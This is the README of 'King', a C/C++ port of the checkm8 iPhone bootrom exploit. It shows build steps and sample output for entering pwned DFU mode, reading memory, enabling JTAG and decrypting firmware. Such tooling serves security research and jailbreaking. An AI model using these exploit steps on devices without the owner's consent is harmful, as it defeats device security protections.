# King

Port of axi0mX's check-m8 exploit (<https://github.com/axi0mX/ipwndfu>) to C/C++

It works on Ubuntu 19.10 and Windows and supports the iPhone7 t8010(iBoot-2696.0.0.1.33) and the iPhone6 (thanks a1exdand).

For Windows use the zadig libusbk driver that contains this fix:

https://github.com/libusb/libusb/pull/699

# Compilation

```bash
cd King
mkdir build
cd build
cmake ..
make
cp -R ../bin .
```

# Run check-m8 exploit
```
sudo ./king checkm8
[*] Shellcode generated ...
[*] Device Serial Number: CPID:8010 ... SRTG:[iBoot-2696.0.0.1.33]
[*] stage 1, heap grooming ...
[*] stage 2, usb setup, send 0x800 of 'A', sends no data
[*] Device Serial Number: CPID:8010 ... SRTG:[iBoot-2696.0.0.1.33]
[*] stage 3, exploit
[*] Device Serial Number: CPID:8010 ... SRTG:[iBoot-2696.0.0.1.33]
[*] Device Serial Number: CPID:8010 ... SRTG:[iBoot-2696.0.0.1.33] PWND:[checkm8]
[!] Device is now in pwned DFU Mode! :D
```

# Read memory
```
sudo ./king read64 0x100000280
[*] Device Serial Number: CPID:8010 ... SRTG:[iBoot-2696.0.0.1.33] PWND:[checkm8]
[*] [100000280] = 36322D746F6F4269
```

```
sudo ./king read32 0x100000280
[*] Device Serial Number: CPID:8010 CPRV:11 ... SRTG:[iBoot-2696.0.0.1.33] PWND:[checkm8]
[*] [100000280] = 6F6F4269
```

# Demote device (Enable JTAG)
```
[*] Device Serial Number: CPID:8010 ... SRTG:[iBoot-2696.0.0.1.33] PWND:[checkm8]
[*] DemotionReg: 287
[*] Setting Value...
[*] New DemotionReg: 286
[!] Succeeded to enable the JTAG!
```

# Decrypt and unpack IM4P firmware image
```
sudo ./king decryptIMG iBoot.d10.RELEASE.im4p   
decryptIMG4
IM4P: ---------
type: ibot
desc: iBoot-5540.0.129
size: 0x00072340

KBAG
num: 1
3c8b957e2bca7ce6e56b41f86490f535
9fde3e44de15dac204f895378d0e7eb03ecc2b67bb1958bb2c70508ea63875f5
num: 2
af60c224bd43c632a17495816dca1ae6
bada1c3314217e7dd6b903d4c3caf3a7aa0f214ec40f13a1085d04bb2d05dc25

[*] Device Serial Number: CPID:8010 ... SRTG:[iBoot-2696.0.0.1.33] PWND:[checkm8][*] Decrypted Keybag: 
DF97....15CE
[*] Decrypted Key: 
369......5CE
[*] Decrypted IV: 
DF........E7
[!] File succesfully decrypted and written to: iBoot.d10.RELEASE.im4p_decrypted
```
